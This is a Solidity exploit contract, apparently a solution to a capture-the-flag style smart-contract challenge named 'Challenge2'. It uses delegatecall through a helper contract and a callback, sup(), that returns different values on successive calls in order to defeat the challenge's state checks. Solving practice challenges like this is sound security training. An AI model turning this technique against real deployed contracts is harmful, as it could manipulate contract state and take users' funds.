// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "./Challenge2.sol";
import "hardhat/console.sol";

contract Exploit is ICalled {
    Challenge2 public immutable instance;
    bool called = false;

    constructor(Challenge2 _instance) payable {
        instance = _instance;
        _instance.first();

        console.log("WINNER", _instance.winner());
        console.log("STATE", uint8(_instance.state()));

        Caller caller = new Caller();

        bytes memory secondData = abi.encodeWithSelector(
            Caller.second.selector,
            address(_instance)
        );

        address(caller).delegatecall(secondData);

        console.log("STATE", uint8(_instance.state()));
    }

    function sup() external override returns (uint256) {
        console.log("SUP");
        if (called) {
            return 80085;
        } else {
            called = true;
            return 1337;
        }
    }

    receive() external payable {}
}

contract Caller {
    function second(Challenge2 instance) external {
        console.log("CALLER SECOND");
        instance.second();
    }

    function fourth(Challenge2 instance) external {
        instance.fourth();
    }
}
